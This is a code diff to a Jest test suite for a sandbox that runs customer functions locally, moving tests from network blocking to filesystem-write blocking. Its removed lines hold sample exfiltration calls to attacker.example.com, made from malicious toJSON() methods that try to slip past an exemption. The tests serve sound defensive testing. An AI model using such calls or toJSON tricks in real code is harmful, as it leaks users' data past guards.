@@ -6,6 +6,9 @@
 
 import type { Logger } from '@dd/core/types';
 import { mockLogFn, mockLogger, moduleResolverFor } from '@dd/tests/_jest/helpers/mocks';
+import fs from 'fs';
+import os from 'os';
+import path from 'path';
 
 import * as shared from '../backend/shared';
 import type { BackendFunction } from '../backend/types';
@@ -94,9 +97,9 @@ function setGlobalFetch(impl: typeof fetch): void {
 }
 
 // `getNetworkGuard()`'s lazy `import('./network-guard')` (see local-execution.ts) defers
-// network-guard.ts's module-load-time side effects (process-wide monkeypatches on net.Socket,
-// fetch, dgram, dns, child_process, worker_threads.Worker) until local execution actually runs,
-// instead of installing them the moment any bundler transitively imports this file via index.ts.
+// network-guard.ts's module-load-time side effects (process-wide monkeypatches on fs write
+// methods, child_process, worker_threads.Worker) until local execution actually runs, instead
+// of installing them the moment any bundler transitively imports this file via index.ts.
 // Not unit-testable under Jest: ts-jest doesn't route TypeScript-compiled modules through Node's
 // native `require.cache`, so inspecting it can't distinguish an eagerly- from a lazily-loaded
 // module here. Verified instead by bundling this file with esbuild (matching what a real
@@ -952,7 +955,8 @@ describe('local-execution — executeScriptLocally', () => {
     });
 
     test("Should keep a hung function's own late continuation blocked after timeout, while a fresh execution afterward still works normally", async () => {
-        let lateNetworkAttempt: Promise<unknown> | undefined;
+        const probePath = path.join(os.tmpdir(), 'dd-local-execution-probe-late.txt');
+        let lateWriteAttempt: Promise<unknown> | undefined;
 
         await expect(
             executeScriptLocally(
@@ -966,8 +970,8 @@ describe('local-execution — executeScriptLocally', () => {
                             // Scheduled, not awaited, so `example` never settles and the race
                             // below times out normally — fires after that 50ms timeout, not before.
                             setTimeout(() => {
-                                lateNetworkAttempt = fetch('https://example.com');
-                                lateNetworkAttempt.catch(() => undefined);
+                                lateWriteAttempt = fs.promises.writeFile(probePath, 'data');
+                                lateWriteAttempt.catch(() => undefined);
                             }, 100);
                         }),
                 }),
@@ -980,10 +984,10 @@ describe('local-execution — executeScriptLocally', () => {
         await new Promise((resolve) => setTimeout(resolve, 100));
 
         // The abandoned continuation's own async chain stays permanently blocked (by design), so
-        // its late network attempt must still be rejected — an identity check on the guarded
+        // its late write attempt must still be rejected — an identity check on the guarded
         // property can't verify this, since the wrapper never changes identity either way.
-        expect(lateNetworkAttempt).toBeDefined();
-        await expect(lateNetworkAttempt).rejects.toThrow(/Network access is not allowed/);
+        expect(lateWriteAttempt).toBeDefined();
+        await expect(lateWriteAttempt).rejects.toThrow(/Writing to the filesystem is not allowed/);
 
         // A fresh execution afterward must still work normally — the abandoned scope above must
         // not permanently wedge network/action access for everything that runs after it.
@@ -1669,17 +1673,18 @@ describe('local-execution — executeScriptLocally', () => {
 
         // Mirrors the raw $.Actions path's malicious-toJSON() test: the action-catalog typed-wrapper
         // path doesn't share code with makeActionsProxy, so it needs the same coverage separately.
-        test("Should block a malicious toJSON() on an action-catalog typed-wrapper call's request from making a real network call under cover of the exemption", async () => {
+        test("Should block a malicious toJSON() on an action-catalog typed-wrapper call's request from making a real fs write under cover of the exemption", async () => {
             jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
             let registeredImpl:
                 | ((actionId: string, request: unknown) => Promise<unknown>)
                 | undefined;
-            let fetchAttempt: Promise<unknown> | undefined;
+            const probePath = path.join(os.tmpdir(), 'dd-local-execution-probe-toJSON-catalog.txt');
+            let writeAttempt: Promise<unknown> | undefined;
             const maliciousRequest = {
                 inputs: {
                     text: 'hi',
                     toJSON() {
-                        fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
+                        writeAttempt = fs.promises.writeFile(probePath, 'exfiltrated');
                         return { text: 'hi' };
                     },
                 },
@@ -1720,8 +1725,8 @@ describe('local-execution — executeScriptLocally', () => {
             );
 
             expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
-            expect(fetchAttempt).toBeDefined();
-            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
+            expect(writeAttempt).toBeDefined();
+            await expect(writeAttempt).rejects.toThrow(/Writing to the filesystem is not allowed/);
         });
 
         // Mirrors the action-catalog abandonment test — apps-backend's setBackend has the same shared-module-level-setter hazard.
@@ -2162,8 +2167,9 @@ describe('local-execution — executeScriptLocally', () => {
         });
     });
 
-    describe('network/subprocess guard', () => {
-        test('Should reject when the customer function tries a raw net.Socket connection', async () => {
+    describe('fs write/subprocess guard', () => {
+        test('Should reject when the customer function tries a raw fs write', async () => {
+            const probePath = path.join(os.tmpdir(), 'dd-local-execution-probe-raw-write.txt');
             await expect(
                 executeScriptLocally(
                     func,
@@ -2173,26 +2179,13 @@ describe('local-execution — executeScriptLocally', () => {
                     loadModuleReturning({
                         example: () => {
                             // eslint-disable-next-line @typescript-eslint/no-require-imports
-                            const net = require('net');
-                            return new net.Socket().connect(80, 'example.com');
+                            const rawFs = require('fs');
+                            return rawFs.promises.writeFile(probePath, 'data');
                         },
                     }),
                     mockLogger,
                 ),
-            ).rejects.toThrow(/Network access is not allowed/);
-        });
-
-        test('Should reject when the customer function tries a raw fetch() call', async () => {
-            await expect(
-                executeScriptLocally(
-                    func,
-                    TEST_PROJECT_ROOT,
-                    [],
-                    stubExecuteAction,
-                    loadModuleReturning({ example: () => fetch('https://example.com') }),
-                    mockLogger,
-                ),
-            ).rejects.toThrow(/Network access is not allowed/);
+            ).rejects.toThrow(/Writing to the filesystem is not allowed/);
         });
 
         test('Should reject when the customer function tries to spawn a subprocess', async () => {
@@ -2214,7 +2207,8 @@ describe('local-execution — executeScriptLocally', () => {
             ).rejects.toThrow(/Spawning a subprocess is not allowed/);
         });
 
-        test('Should still let a real $.Actions call through while the rest of the function is network-blocked', async () => {
+        test('Should still let a real $.Actions call through while the rest of the function is blocked', async () => {
+            const probePath = path.join(os.tmpdir(), 'dd-local-execution-probe-after-action.txt');
             const executeAction = jest.fn().mockResolvedValue({ ok: true });
             const result = await executeScriptLocally(
                 func,
@@ -2226,9 +2220,9 @@ describe('local-execution — executeScriptLocally', () => {
                         const actionResult = await testDollar().Actions.slack.chat.postMessage({
                             inputs: { text: 'hi' },
                         });
-                        // A raw fetch right after the sanctioned $.Actions call must still be blocked — the exemption is scoped to that one call.
-                        await expect(fetch('https://example.com')).rejects.toThrow(
-                            /Network access is not allowed/,
+                        // A raw write right after the sanctioned $.Actions call must still be blocked — the exemption is scoped to that one call.
+                        await expect(fs.promises.writeFile(probePath, 'data')).rejects.toThrow(
+                            /Writing to the filesystem is not allowed/,
                         );
                         return actionResult;
                     },
@@ -2243,14 +2237,15 @@ describe('local-execution — executeScriptLocally', () => {
             );
         });
 
-        test('Should block a malicious toJSON() on $.Actions inputs from making a real network call under cover of the exemption', async () => {
-            // toJSON() must be synchronous, so its fetch attempt can't be awaited there — capture the outcome and assert once the whole execution settles.
-            let fetchAttempt: Promise<unknown> | undefined;
+        test('Should block a malicious toJSON() on $.Actions inputs from making a real fs write under cover of the exemption', async () => {
+            // toJSON() must be synchronous, so its write attempt can't be awaited there — capture the outcome and assert once the whole execution settles.
+            const probePath = path.join(os.tmpdir(), 'dd-local-execution-probe-toJSON.txt');
+            let writeAttempt: Promise<unknown> | undefined;
             const maliciousInputs = {
                 text: 'hi',
                 toJSON() {
                     // Would resolve instead of rejecting if this ran inside runAllowed's window, meant only for the trusted preview-async call itself.
-                    fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
+                    writeAttempt = fs.promises.writeFile(probePath, 'exfiltrated');
                     return { text: 'hi' };
                 },
             };
@@ -2270,8 +2265,8 @@ describe('local-execution — executeScriptLocally', () => {
             );
 
             expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
-            expect(fetchAttempt).toBeDefined();
-            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
+            expect(writeAttempt).toBeDefined();
+            await expect(writeAttempt).rejects.toThrow(/Writing to the filesystem is not allowed/);
         });
 
         test('Should restore real network access after execution, for whatever the dev server itself does next', async () => {
@@ -2401,10 +2396,10 @@ describe('local-execution — executeScriptLocally', () => {
     });
 
     describe('loadCustomerModuleEntry', () => {
-        // Regression test: network-guard.ts's trustedStdout/trustedStderr are captured at that
-        // module's own load time (see network-guard.ts). If the customer module's top-level code
-        // ran first, it could repoint process.stdout before the guard ever captures it, permanently
-        // defeating the write-blocking exemption check for every later execution in the process.
+        // Regression test: network-guard.ts's trustedFetch is captured at that module's own load
+        // time (see network-guard.ts). If the customer module's top-level code ran first, it could
+        // reassign globalThis.fetch before the guard ever captures it, permanently defeating the
+        // dev server's own authenticated-fetch protection for every later execution in the process.
         // loadCustomerModuleEntry is the one choke point every caller (executeColdActionLocally's
         // priming, runScriptLocally's own fallback) funnels through, so asserting order here covers
         // every path. Isolates both modules fresh so the assertion isn't satisfied by network-guard
